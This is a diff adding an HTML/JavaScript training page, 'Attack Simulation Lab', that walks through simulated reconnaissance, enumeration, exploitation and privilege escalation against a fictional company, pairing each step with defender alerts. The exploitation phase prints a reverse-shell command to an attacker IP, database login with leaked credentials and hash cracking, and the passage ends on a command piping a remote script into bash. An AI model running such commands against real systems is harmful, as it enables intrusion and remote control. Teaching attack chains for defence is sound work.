@@ -1,0 +1,1183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberDefend · Attack Simulation Lab</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0e14;
+            --bg-raised: #0f1419;
+            --bg-card: #131920;
+            --bg-terminal: #080c10;
+            --fg: #c5cdd8;
+            --fg-bright: #e8edf3;
+            --fg-dim: #4d5969;
+            --accent: #00ff9c;
+            --accent-dim: rgba(0,255,156,0.12);
+            --accent-mid: rgba(0,255,156,0.3);
+            --red: #ff3b5c;
+            --red-dim: rgba(255,59,92,0.12);
+            --orange: #ff9f43;
+            --orange-dim: rgba(255,159,67,0.12);
+            --cyan: #00d4ff;
+            --cyan-dim: rgba(0,212,255,0.12);
+            --yellow: #ffd93d;
+            --yellow-dim: rgba(255,217,61,0.12);
+            --purple: #a855f7;
+            --border: #1e2733;
+            --border-light: #2a3544;
+            --radius: 10px;
+            --mono: 'JetBrains Mono', 'Courier New', monospace;
+            --sans: 'Inter', system-ui, sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: var(--sans);
+            background: var(--bg);
+            color: var(--fg);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* === BACKGROUND EFFECTS === */
+        .bg-grid {
+            position: fixed; inset: 0; z-index: 0; pointer-events: none;
+            background-image:
+                linear-gradient(rgba(0,255,156,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,156,0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+        }
+        .bg-glow {
+            position: fixed; z-index: 0; pointer-events: none;
+            width: 600px; height: 600px; border-radius: 50%;
+            filter: blur(150px); opacity: 0.07;
+        }
+        .bg-glow-1 { top: -200px; right: -100px; background: var(--accent); }
+        .bg-glow-2 { bottom: -200px; left: -100px; background: var(--cyan); }
+
+        /* === LAYOUT === */
+        .app-container { position: relative; z-index: 1; }
+
+        /* === TOP BAR === */
+        .top-bar {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 16px 32px;
+            background: rgba(10,14,20,0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            position: sticky; top: 0; z-index: 100;
+        }
+        .top-bar-left { display: flex; align-items: center; gap: 14px; }
+        .top-bar-logo {
+            width: 36px; height: 36px; border-radius: 8px;
+            background: linear-gradient(135deg, var(--accent), var(--cyan));
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1rem; color: #000; font-weight: 800;
+        }
+        .top-bar-title { font-size: 1rem; font-weight: 700; color: var(--fg-bright); }
+        .top-bar-sub { font-size: 0.65rem; color: var(--fg-dim); font-weight: 500; letter-spacing: 1px; text-transform: uppercase; }
+        .top-bar-right { display: flex; align-items: center; gap: 12px; }
+        .status-badge {
+            display: flex; align-items: center; gap: 6px;
+            padding: 6px 14px; border-radius: 20px; font-size: 0.75rem; font-weight: 600;
+            border: 1px solid var(--border-light);
+        }
+        .status-badge.idle { background: var(--bg-card); color: var(--fg-dim); }
+        .status-badge.running { background: var(--accent-dim); color: var(--accent); border-color: var(--accent-mid); }
+        .status-badge.complete { background: var(--cyan-dim); color: var(--cyan); border-color: rgba(0,212,255,0.3); }
+        .status-dot { width: 7px; height: 7px; border-radius: 50%; }
+        .status-badge.idle .status-dot { background: var(--fg-dim); }
+        .status-badge.running .status-dot { background: var(--accent); animation: pulse-dot 1.5s infinite; }
+        .status-badge.complete .status-dot { background: var(--cyan); }
+        @keyframes pulse-dot { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        .btn-reset {
+            padding: 7px 16px; border-radius: 8px; font-size: 0.78rem; font-weight: 600;
+            background: var(--bg-card); color: var(--fg); border: 1px solid var(--border-light);
+            cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 6px;
+            font-family: var(--sans);
+        }
+        .btn-reset:hover { border-color: var(--red); color: var(--red); background: var(--red-dim); }
+
+        /* === MAIN CONTENT === */
+        .main-layout {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 0;
+            min-height: calc(100vh - 69px);
+        }
+
+        /* === SIDEBAR === */
+        .sidebar {
+            background: var(--bg-raised);
+            border-right: 1px solid var(--border);
+            padding: 24px 0;
+            overflow-y: auto;
+            max-height: calc(100vh - 69px);
+            position: sticky; top: 69px;
+        }
+        .sidebar::-webkit-scrollbar { width: 3px; }
+        .sidebar::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 10px; }
+
+        .sidebar-label {
+            font-size: 0.65rem; font-weight: 700; color: var(--fg-dim);
+            text-transform: uppercase; letter-spacing: 1.5px;
+            padding: 0 20px; margin-bottom: 14px;
+        }
+
+        .phase-item {
+            display: flex; align-items: flex-start; gap: 12px;
+            padding: 12px 20px; cursor: pointer;
+            transition: 0.2s; border-left: 3px solid transparent;
+            position: relative;
+        }
+        .phase-item:hover { background: rgba(255,255,255,0.02); }
+        .phase-item.active { background: var(--accent-dim); border-left-color: var(--accent); }
+        .phase-item.done { opacity: 0.6; }
+        .phase-item.done .phase-num { background: var(--accent); color: #000; }
+
+        .phase-num {
+            width: 28px; height: 28px; border-radius: 7px; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.72rem; font-weight: 700;
+            background: var(--bg-card); color: var(--fg-dim);
+            border: 1px solid var(--border-light);
+            font-family: var(--mono);
+            transition: 0.3s;
+        }
+        .phase-item.active .phase-num { background: var(--accent); color: #000; border-color: var(--accent); }
+
+        .phase-info { flex: 1; min-width: 0; }
+        .phase-name { font-size: 0.82rem; font-weight: 600; color: var(--fg-bright); line-height: 1.3; }
+        .phase-item.active .phase-name { color: var(--accent); }
+        .phase-desc { font-size: 0.68rem; color: var(--fg-dim); margin-top: 2px; line-height: 1.3; }
+
+        .sidebar-progress {
+            margin: 24px 20px 0; padding: 16px;
+            background: var(--bg-card); border-radius: var(--radius);
+            border: 1px solid var(--border);
+        }
+        .progress-label { font-size: 0.68rem; font-weight: 600; color: var(--fg-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; display: flex; justify-content: space-between; }
+        .progress-bar-bg { height: 6px; background: var(--bg); border-radius: 3px; overflow: hidden; }
+        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--cyan)); border-radius: 3px; transition: width 0.5s ease; width: 0%; }
+
+        /* === CONTENT AREA === */
+        .content-area { padding: 28px 32px; overflow-y: auto; }
+
+        /* Phase Header */
+        .phase-header { margin-bottom: 28px; }
+        .phase-header-num {
+            display: inline-flex; align-items: center; gap: 8px;
+            font-size: 0.72rem; font-weight: 700; color: var(--accent);
+            text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px;
+            font-family: var(--mono);
+        }
+        .phase-header-num::before {
+            content: ''; width: 24px; height: 2px; background: var(--accent); border-radius: 1px;
+        }
+        .phase-header h2 { font-size: 1.8rem; font-weight: 800; color: var(--fg-bright); line-height: 1.2; margin-bottom: 10px; }
+        .phase-header p { font-size: 0.9rem; color: var(--fg-dim); line-height: 1.7; max-width: 700px; }
+
+        /* Cards */
+        .info-card {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: var(--radius); padding: 20px; margin-bottom: 20px;
+            transition: border-color 0.2s;
+        }
+        .info-card:hover { border-color: var(--border-light); }
+        .info-card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+        .info-card-icon {
+            width: 34px; height: 34px; border-radius: 8px;
+            display: flex; align-items: center; justify-content: center; font-size: 0.9rem;
+        }
+        .info-card-icon.green { background: var(--accent-dim); color: var(--accent); }
+        .info-card-icon.red { background: var(--red-dim); color: var(--red); }
+        .info-card-icon.orange { background: var(--orange-dim); color: var(--orange); }
+        .info-card-icon.cyan { background: var(--cyan-dim); color: var(--cyan); }
+        .info-card-icon.yellow { background: var(--yellow-dim); color: var(--yellow); }
+        .info-card-icon.purple { background: rgba(168,85,247,0.12); color: var(--purple); }
+        .info-card-title { font-size: 0.95rem; font-weight: 700; color: var(--fg-bright); }
+        .info-card p, .info-card li { font-size: 0.84rem; color: var(--fg); line-height: 1.7; }
+        .info-card ul { list-style: none; padding: 0; }
+        .info-card ul li { padding: 4px 0; padding-left: 18px; position: relative; }
+        .info-card ul li::before {
+            content: '→'; position: absolute; left: 0; color: var(--accent); font-weight: 700;
+        }
+
+        /* Terminal */
+        .terminal-wrapper { margin-bottom: 24px; }
+        .terminal-bar {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 10px 16px;
+            background: #0d1117; border: 1px solid var(--border); border-bottom: none;
+            border-radius: var(--radius) var(--radius) 0 0;
+        }
+        .terminal-dots { display: flex; gap: 7px; }
+        .terminal-dots span { width: 11px; height: 11px; border-radius: 50%; }
+        .terminal-dots span:nth-child(1) { background: #ff5f57; }
+        .terminal-dots span:nth-child(2) { background: #febc2e; }
+        .terminal-dots span:nth-child(3) { background: #28c840; }
+        .terminal-tab {
+            font-size: 0.72rem; font-weight: 600; color: var(--fg-dim);
+            font-family: var(--mono); padding: 4px 12px;
+            background: var(--bg-card); border-radius: 5px;
+            border: 1px solid var(--border);
+        }
+        .terminal-actions { display: flex; gap: 6px; }
+        .terminal-btn {
+            padding: 4px 10px; border-radius: 5px; font-size: 0.68rem; font-weight: 600;
+            border: 1px solid var(--border-light); background: var(--bg-card);
+            color: var(--fg-dim); cursor: pointer; font-family: var(--mono);
+            transition: 0.2s;
+        }
+        .terminal-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .terminal-btn.run { background: var(--accent-dim); color: var(--accent); border-color: var(--accent-mid); }
+        .terminal-btn.run:hover { background: var(--accent); color: #000; }
+
+        .terminal-body {
+            background: var(--bg-terminal); border: 1px solid var(--border); border-top: none;
+            border-radius: 0 0 var(--radius) var(--radius);
+            padding: 16px; min-height: 200px; max-height: 450px; overflow-y: auto;
+            font-family: var(--mono); font-size: 0.8rem; line-height: 1.7;
+        }
+        .terminal-body::-webkit-scrollbar { width: 4px; }
+        .terminal-body::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 10px; }
+
+        .t-line { white-space: pre-wrap; word-break: break-all; }
+        .t-prompt { color: var(--accent); }
+        .t-cmd { color: var(--fg-bright); }
+        .t-output { color: var(--fg-dim); }
+        .t-highlight { color: var(--cyan); }
+        .t-warning { color: var(--orange); }
+        .t-error { color: var(--red); }
+        .t-success { color: var(--accent); }
+        .t-info { color: var(--yellow); }
+        .t-separator { color: var(--border-light); }
+
+        .cursor-blink {
+            display: inline-block; width: 8px; height: 15px;
+            background: var(--accent); vertical-align: middle;
+            animation: blink-cursor 1s step-end infinite;
+        }
+        @keyframes blink-cursor { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
+
+        /* Network Topology */
+        .network-viz {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: var(--radius); padding: 24px; margin-bottom: 24px;
+            position: relative; overflow: hidden;
+        }
+        .network-viz::before {
+            content: ''; position: absolute; inset: 0;
+            background-image: radial-gradient(circle, var(--border) 1px, transparent 1px);
+            background-size: 30px 30px; opacity: 0.5;
+        }
+        .network-title { font-size: 0.72rem; font-weight: 700; color: var(--fg-dim); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 20px; position: relative; }
+        .network-nodes { display: flex; align-items: center; justify-content: center; gap: 40px; flex-wrap: wrap; position: relative; }
+        .net-node {
+            display: flex; flex-direction: column; align-items: center; gap: 8px;
+            position: relative; z-index: 1;
+        }
+        .net-node-icon {
+            width: 56px; height: 56px; border-radius: 14px;
+            display: flex; align-items: center; justify-content: center; font-size: 1.3rem;
+            border: 2px solid var(--border-light); transition: 0.5s;
+        }
+        .net-node-icon.attacker { background: var(--red-dim); color: var(--red); border-color: rgba(255,59,92,0.3); }
+        .net-node-icon.target { background: var(--orange-dim); color: var(--orange); border-color: rgba(255,159,67,0.3); }
+        .net-node-icon.internal { background: var(--cyan-dim); color: var(--cyan); border-color: rgba(0,212,255,0.3); }
+        .net-node-icon.exfil { background: var(--purple); color: #fff; border-color: rgba(168,85,247,0.3); }
+        .net-node-icon.safe { background: var(--accent-dim); color: var(--accent); border-color: var(--accent-mid); }
+
+        .net-node-icon.pulsing { animation: node-pulse 2s infinite; }
+        @keyframes node-pulse {
+            0%,100% { box-shadow: 0 0 0 0 rgba(255,59,92,0.4); }
+            50% { box-shadow: 0 0 0 12px rgba(255,59,92,0); }
+        }
+        .net-node-label { font-size: 0.72rem; font-weight: 600; color: var(--fg-dim); text-align: center; }
+        .net-node-ip { font-size: 0.65rem; color: var(--fg-dim); font-family: var(--mono); opacity: 0.6; }
+
+        .net-arrow {
+            color: var(--fg-dim); font-size: 1.2rem; opacity: 0.4;
+            position: relative; z-index: 1;
+        }
+        .net-arrow.active { color: var(--red); opacity: 1; animation: arrow-flow 1.5s infinite; }
+        @keyframes arrow-flow { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        /* Alert Log */
+        .alert-log {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: var(--radius); margin-bottom: 24px; overflow: hidden;
+        }
+        .alert-log-header {
+            padding: 12px 16px; border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .alert-log-title { font-size: 0.78rem; font-weight: 700; color: var(--fg-dim); text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 8px; }
+        .alert-log-count {
+            font-size: 0.68rem; font-weight: 700; padding: 2px 8px;
+            border-radius: 10px; font-family: var(--mono);
+        }
+        .alert-log-count.critical { background: var(--red-dim); color: var(--red); }
+        .alert-log-count.warning { background: var(--orange-dim); color: var(--orange); }
+        .alert-log-count.info { background: var(--cyan-dim); color: var(--cyan); }
+
+        .alert-log-body { max-height: 200px; overflow-y: auto; }
+        .alert-log-body::-webkit-scrollbar { width: 3px; }
+        .alert-log-body::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 10px; }
+
+        .alert-entry {
+            display: flex; align-items: flex-start; gap: 10px;
+            padding: 10px 16px; border-bottom: 1px solid var(--border);
+            font-size: 0.78rem; animation: alert-slide 0.3s ease;
+        }
+        @keyframes alert-slide { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+        .alert-entry:last-child { border-bottom: none; }
+        .alert-time { color: var(--fg-dim); font-family: var(--mono); font-size: 0.7rem; white-space: nowrap; padding-top: 1px; }
+        .alert-severity {
+            font-size: 0.6rem; font-weight: 700; padding: 2px 6px; border-radius: 4px;
+            text-transform: uppercase; white-space: nowrap;
+        }
+        .alert-severity.critical { background: var(--red-dim); color: var(--red); }
+        .alert-severity.high { background: var(--orange-dim); color: var(--orange); }
+        .alert-severity.medium { background: var(--yellow-dim); color: var(--yellow); }
+        .alert-severity.low { background: var(--cyan-dim); color: var(--cyan); }
+        .alert-msg { color: var(--fg); line-height: 1.4; }
+
+        /* Next Phase Button */
+        .btn-next-phase {
+            display: inline-flex; align-items: center; gap: 10px;
+            padding: 14px 32px; border-radius: var(--radius);
+            font-size: 0.9rem; font-weight: 700; cursor: pointer;
+            background: linear-gradient(135deg, var(--accent), #00d4aa);
+            color: #000; border: none; font-family: var(--sans);
+            transition: 0.3s; box-shadow: 0 4px 20px rgba(0,255,156,0.2);
+        }
+        .btn-next-phase:hover { transform: translateY(-2px); box-shadow: 0 6px 30px rgba(0,255,156,0.3); }
+        .btn-next-phase:disabled { opacity: 0.3; cursor: not-allowed; transform: none; box-shadow: none; }
+
+        .phase-complete-banner {
+            display: none; align-items: center; gap: 12px;
+            padding: 16px 20px; border-radius: var(--radius);
+            background: var(--accent-dim); border: 1px solid var(--accent-mid);
+            margin-bottom: 24px;
+        }
+        .phase-complete-banner.show { display: flex; }
+        .phase-complete-banner i { color: var(--accent); font-size: 1.2rem; }
+        .phase-complete-banner span { color: var(--accent); font-weight: 600; font-size: 0.88rem; }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-layout { grid-template-columns: 1fr; }
+            .sidebar {
+                position: relative; top: 0; max-height: none;
+                display: flex; overflow-x: auto; padding: 12px;
+                border-right: none; border-bottom: 1px solid var(--border);
+                gap: 4px;
+            }
+            .sidebar-label { display: none; }
+            .sidebar-progress { display: none; }
+            .phase-item { padding: 10px 14px; white-space: nowrap; border-left: none; border-bottom: 2px solid transparent; flex-shrink: 0; }
+            .phase-item.active { border-bottom-color: var(--accent); border-left: none; }
+            .phase-desc { display: none; }
+        }
+        @media (max-width: 600px) {
+            .top-bar { padding: 12px 16px; }
+            .content-area { padding: 20px 16px; }
+            .phase-header h2 { font-size: 1.4rem; }
+            .network-nodes { gap: 20px; }
+            .net-node-icon { width: 44px; height: 44px; font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-glow bg-glow-1"></div>
+<div class="bg-glow bg-glow-2"></div>
+
+<div class="app-container">
+
+    <!-- TOP BAR -->
+    <div class="top-bar">
+        <div class="top-bar-left">
+            <div class="top-bar-logo"><i class="fas fa-crosshairs"></i></div>
+            <div>
+                <div class="top-bar-title">Attack Simulation Lab</div>
+                <div class="top-bar-sub">CyberDefend Academy</div>
+            </div>
+        </div>
+        <div class="top-bar-right">
+            <div class="status-badge idle" id="statusBadge">
+                <span class="status-dot"></span>
+                <span id="statusText">Ready</span>
+            </div>
+            <button class="btn-reset" id="btnReset" onclick="resetLab()">
+                <i class="fas fa-rotate-left"></i> Reset
+            </button>
+        </div>
+    </div>
+
+    <!-- MAIN LAYOUT -->
+    <div class="main-layout">
+
+        <!-- SIDEBAR -->
+        <aside class="sidebar" id="sidebar"></aside>
+
+        <!-- CONTENT -->
+        <main class="content-area" id="contentArea"></main>
+
+    </div>
+</div>
+
+<script>
+// ============================================================
+// ATTACK SIMULATION LAB — Complete Phase Data & Engine
+// ============================================================
+
+const PHASES = [
+    {
+        id: 1,
+        name: "Reconnaissance",
+        desc: "Passive & active information gathering",
+        icon: "fa-magnifying-glass",
+        color: "cyan",
+        overview: "The attacker begins by collecting as much information as possible about the target without directly engaging their systems. This includes DNS records, subdomains, IP ranges, publicly exposed services, and any leaked credentials or sensitive data found on search engines or public repositories.",
+        objectives: [
+            "Identify the target's external IP address range and ASN information",
+            "Enumerate all subdomains and map the attack surface",
+            "Discover open ports and running services via active scanning",
+            "Gather OSINT data from public sources (search engines, social media, pastebins)"
+        ],
+        tools: ["Nmap", "Amass", "theHarvester", "DNSRecon", "Shodan", "Whois"],
+        network: { attacker: true, arrow1: false, target: false, arrow2: false, internal: false, arrow3: false, exfil: false },
+        terminal: [
+            { type: "cmd", text: "whois targetcorp.com" },
+            { type: "output", text: "Domain Name: TARGETCORP.COM\nRegistrar: GoDaddy.com, LLC\nCreation Date: 2019-03-15T08:22:31Z\nExpiry Date: 2026-03-15T08:22:31Z\nName Server: ns1.targetcorp.com\nName Server: ns2.targetcorp.com\nDNSSEC: unsigned" },
+            { type: "separator" },
+            { type: "cmd", text: "amass enum -passive -d targetcorp.com" },
+            { type: "output", text: "targetcorp.com\nwww.targetcorp.com\nmail.targetcorp.com\nvpn.targetcorp.com\ndev.targetcorp.com\nstaging.targetcorp.com\napi.targetcorp.com\nadmin.targetcorp.com\nportal.targetcorp.com\ndb-backup.targetcorp.com" },
+            { type: "separator" },
+            { type: "cmd", text: "nmap -sV -sC -O 203.0.113.0/24 --open" },
+            { type: "output", text: "Starting Nmap 7.94 ( https://nmap.org )\nScanning 256 hosts...\n\nDiscovered open port(s):\n\n203.0.113.10:  22/tcp  open  ssh     OpenSSH 8.9p1\n203.0.113.10:  80/tcp  open  http    Apache 2.4.52\n203.0.113.10:  443/tcp open  https   Apache 2.4.52\n203.0.113.15:  3306/tcp open mysql  MySQL 8.0.28\n203.0.113.20:  8080/tcp open http-proxy Squid 5.2\n203.0.113.25:  21/tcp  open  ftp     vsftpd 3.0.5\n\nOS detection: 203.0.113.10 → Linux 5.x\nNmap done: 256 IP addresses (6 hosts up)" },
+            { type: "separator" },
+            { type: "cmd", text: "theHarvester -d targetcorp.com -b google,bing,linkedin" },
+            { type: "output", text: "[*] Target: targetcorp.com\n[*] Google: 142 results\n[*] Bing:   89 results\n[*] LinkedIn: 34 results\n\nEmails found:\n  admin@targetcorp.com\n  j.smith@targetcorp.com\n  s.devops@targetcorp.com\n  it-support@targetcorp.com\n\nHosts found:\n  203.0.113.10  (www.targetcorp.com)\n  203.0.113.25  (ftp.targetcorp.com)" }
+        ],
+        alerts: [
+            { severity: "low", msg: "External reconnaissance detected from 198.51.100.42 — DNS enumeration queries to targetcorp.com zone" },
+            { severity: "low", msg: "Port scan activity detected — SYN scan pattern from single source across 203.0.113.0/24" },
+            { severity: "medium", msg: "OSINT exposure — 4 corporate email addresses and 9 subdomains discovered in public records" }
+        ]
+    },
+    {
+        id: 2,
+        name: "Scanning & Enumeration",
+        desc: "Deep service probing & vulnerability mapping",
+        icon: "fa-radar",
+        color: "orange",
+        overview: "With the initial footprint established, the attacker performs deeper enumeration of discovered services. This includes banner grabbing, directory brute-forcing, API endpoint discovery, database schema extraction attempts, and identifying specific software versions to match against known vulnerability databases.",
+        objectives: [
+            "Fingerprint exact versions of all running services for CVE matching",
+            "Enumerate web directories, hidden files, and API endpoints",
+            "Identify potential misconfigurations (open directories, default credentials)",
+            "Map database schemas and identify exposed management interfaces"
+        ],
+        tools: ["Nikto", "Gobuster", "Dirb", "Enum4linux", "Sqlmap", "WhatWeb"],
+        network: { attacker: true, arrow1: true, target: true, arrow2: false, internal: false, arrow3: false, exfil: false },
+        terminal: [
+            { type: "cmd", text: "whatweb -v http://203.0.113.10" },
+            { type: "output", text: "http://203.0.113.10 [200 OK] Apache[2.4.52], PHP[8.1.2],\n  jQuery[3.6.0], WordPress[5.9.3],\n  X-Powered-By: PHP/8.1.2,\n  Server: Apache/2.4.52 (Ubuntu)\n  MetaGenerator: WordPress 5.9.3" },
+            { type: "separator" },
+            { type: "cmd", text: "gobuster dir -u http://203.0.113.10 -w /usr/share/wordlists/dirb/big.txt -x php,html,bak,txt" },
+            { type: "output", text: "/index.php            (Status: 200) [Size: 12483]\n/wp-login.php         (Status: 200) [Size: 5382]\n/wp-admin/            (Status: 302) [Size: 0] [→ /wp-login.php]\n/readme.html          (Status: 200) [Size: 7412]\n/.htaccess            (Status: 403) [Size: 277]\n/backup/              (Status: 200) [Size: 4218]\n/backup/db_dump.sql   (Status: 200) [Size: 2847561]  *** HIGH ***\n/config.php.bak      (Status: 200) [Size: 1847]    *** HIGH ***\n/phpmyadmin/          (Status: 200) [Size: 12890]" },
+            { type: "separator" },
+            { type: "cmd", text: "nikto -h http://203.0.113.10" },
+            { type: "output", text: "- Nikto v2.1.6\n+ Server: Apache/2.4.52 (Ubuntu)\n+ /: The X-Content-Type-Options header is not set.\n+ /: Directory indexing found.\n+ /backup/: Directory browsing enabled.\n+ /config.php.bak: Config backup file found — may contain credentials.\n+ /wp-login.php: WordPress login page detected.\n+ 7915 requests: 5 error(s) and 12 item(s) reported on remote host" },
+            { type: "separator" },
+            { type: "cmd", text: "nmap -sV --script vuln 203.0.113.10 -p 80,443,22" },
+            { type: "output", text: "PORT    STATE SERVICE\n22/tcp  open  ssh\n  vulns:\n    CVE-2023-38408: OpenSSH forward agent hijacking\n443/tcp open  https\n  vulns:\n    CVE-2022-27782: curl TLS session reuse\n80/tcp  open  http\n  vulns:\n    CVE-2022-22965: Spring4Shell RCE (false positive on WP)\n    CVE-2019-8924: WordPress XML-RPC brute force" }
+        ],
+        alerts: [
+            { severity: "high", msg: "CRITICAL: Unauthenticated access to /backup/db_dump.sql — 2.8 MB database dump exposed" },
+            { severity: "high", msg: "CRITICAL: Configuration backup /config.php.bak accessible — likely contains DB credentials" },
+            { severity: "medium", msg: "phpMyAdmin interface exposed at /phpmyadmin/ without IP restriction" },
+            { severity: "medium", msg: "Multiple CVEs flagged on web server: CVE-2023-38408 (SSH), CVE-2019-8924 (WP XML-RPC)" }
+        ]
+    },
+    {
+        id: 3,
+        name: "Exploitation",
+        desc: "Gaining initial access to the target",
+        icon: "fa-bolt",
+        color: "red",
+        overview: "The attacker leverages the vulnerabilities and misconfigurations discovered in previous phases to gain an initial foothold on the target system. This typically involves exploiting a specific vulnerability, using stolen credentials from the leaked database dump, or chaining multiple low-severity issues to achieve remote code execution.",
+        objectives: [
+            "Extract credentials from the leaked database dump and configuration backup",
+            "Attempt authentication using discovered credentials on all services",
+            "Exploit identified CVEs to achieve remote code execution",
+            "Establish a stable reverse shell connection to the target"
+        ],
+        tools: ["Metasploit", "Sqlmap", "Burp Suite", "Netcat", "Chisel", "LinPEAS"],
+        network: { attacker: true, arrow1: true, target: true, arrow2: true, internal: false, arrow3: false, exfil: false },
+        terminal: [
+            { type: "cmd", text: "cat /tmp/db_dump.sql | grep -i 'insert into.*users'" },
+            { type: "output", text: "INSERT INTO wp_users VALUES (1,'admin','$P$Bk1234567890abcdef...',\n  'admin@targetcorp.com','2022-01-15',1,'Admin');\nINSERT INTO wp_users VALUES (2,'j.smith','$P$Bx9876543210fedcba...',\n  'j.smith@targetcorp.com','2022-03-22',0,'John Smith');\nINSERT INTO wp_users VALUES (3,'s.devops','$P$Byabcdef1234567890...',\n  's.devops@targetcorp.com','2022-06-10',1,'Sys Admin');" },
+            { type: "separator" },
+            { type: "cmd", text: "cat /tmp/config.php.bak" },
+            { type: "output", text: "<?php\ndefine('DB_NAME', 'targetcorp_wp');\ndefine('DB_USER', 'wp_admin');\ndefine('DB_PASSWORD', 'Tc@2022!SecR3t#Db');\ndefine('DB_HOST', '203.0.113.15:3306');\ndefine('DB_CHARSET', 'utf8mb4');\n?>" },
+            { type: "separator" },
+            { type: "cmd", text: "mysql -h 203.0.113.15 -u wp_admin -p'Tc@2022!SecR3t#Db' -e 'SELECT user,host FROM mysql.user;'" },
+            { type: "output", text: "+-----------+------------------+\n| user      | host             |\n+-----------+------------------+\n| root      | localhost        |\n| wp_admin  | %                |\n| backup_usr| 203.0.113.%       |\n| repl_user | 203.0.113.20     |\n+-----------+------------------+" },
+            { type: "separator" },
+            { type: "cmd", text: "hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt" },
+            { type: "output", text: "$P$Bk1234567890abcdef...:Welcome2022!\n$P$Bx9876543210fedcba...:SmithPass!99\n$P$Byabcdef1234567890...:D3vOps#2023!\n\n3/3 hashes cracked in 4.2 seconds" },
+            { type: "separator" },
+            { type: "cmd", text: "ssh j.smith@203.0.113.10" },
+            { type: "output", text: "j.smith@203.0.113.10's password: SmithPass!99\nWelcome to Ubuntu 22.04.2 LTS\nLast login: Mon Jun 12 09:14:32 2024\nj.smith@webserver:~$ id\nuid=1001(j.smith) gid=1001(devteam) groups=1001(devteam),27(sudo)\nj.smith@webserver:~$ sudo -l\n[sudo] password for j.smith:\nUser j.smith may run the following commands on webserver:\n    (ALL : ALL) ALL" },
+            { type: "separator" },
+            { type: "cmd", text: "j.smith@webserver:~$ bash -i >& /dev/tcp/198.51.100.42/4444 0>&1 &" },
+            { type: "output", text: "[*] Listener: receiving connection from 203.0.113.10:49218\n[*] Shell session opened\n\nwhoami\nj.smith\nhostname\nwebserver.targetcorp.com\nuname -a\nLinux webserver 5.15.0-76-generic #83-Ubuntu SMP x86_64 GNU/Linux" },
+            { type: "success", text: ">>> INITIAL ACCESS ACHIEVED — Reverse shell established on webserver (203.0.113.10)" }
+        ],
+        alerts: [
+            { severity: "critical", msg: "CRITICAL: Successful SSH authentication as j.smith using cracked password from leaked DB dump" },
+            { severity: "critical", msg: "CRITICAL: Reverse shell connection detected — outbound to 198.51.100.42:4444 from webserver" },
+            { severity: "high", msg: "HIGH: User j.smith has full sudo privileges — privilege escalation path identified" },
+            { severity: "high", msg: "HIGH: MySQL database accessed remotely using credentials from config.php.bak" },
+            { severity: "medium", msg: "MEDIUM: 3 WordPress password hashes cracked using rockyou wordlist in < 5 seconds" }
+        ]
+    },
+    {
+        id: 4,
+        name: "Privilege Escalation",
+        desc: "Elevating access from user to root/SYSTEM",
+        icon: "fa-arrow-up-right-dots",
+        color: "orange",
+        overview: "With initial access established as a low-privileged user, the attacker seeks to elevate their privileges to root or administrator level. This involves checking for SUID binaries, misconfigured sudo rules, exploitable cron jobs, kernel vulnerabilities, or weak file permissions that can be leveraged to gain full system control.",
+        objectives: [
+            "Enumerate local privilege escalation vectors using automated scripts",
+            "Exploit misconfigured sudo rules or SUID binaries",
+            "Check for kernel exploits matching the running OS version",
+            "Harvest additional credentials from memory, config files, and keytabs"
+        ],
+        tools: ["LinPEAS", "GTFOBins", "CVE-2023-32233", "Mimikatz", "Pspy", "Capabilities"],
+        network: { attacker: true, arrow1: true, target: true, arrow2: true, internal: false, arrow3: false, exfil: false },
+        terminal: [
+            { type: "cmd", text: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash" },
